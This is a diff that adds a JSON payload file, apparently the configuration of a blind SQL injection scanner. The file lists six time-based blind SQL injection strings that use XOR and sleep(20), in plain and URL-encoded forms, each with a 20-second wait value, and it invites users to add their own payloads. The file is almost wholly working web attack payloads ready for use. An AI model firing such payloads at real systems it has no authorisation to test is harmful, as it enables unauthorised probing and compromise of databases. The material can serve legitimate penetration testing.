@@ -1,0 +1,11 @@
+{
+  "_comment": "/* You can Add Custom Payloads HERE (Please Don't Change Key Names , You can Change Values!! (Payload , TimeWait))*/",
+  "Blind_SQLi": {
+    "0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z": 20,
+    "0'XOR(if(now()=sysdate()%2Csleep(20)%2C0))XOR'Z": 20,
+    "0%27XOR(if(now()=sysdate()%2Csleep(20)%2C0))XOR%27Z": 20,
+    "0\"XOR(if(now()=sysdate(),sleep(20),0))XOR\"Z": 20,
+    "0%22XOR(if(now()=sysdate(),sleep(20),0))XOR%22Z": 20,
+    "0%22XOR(if(now()=sysdate()%2Csleep(20)%2C0))XOR%22Z": 20
+  }
+}
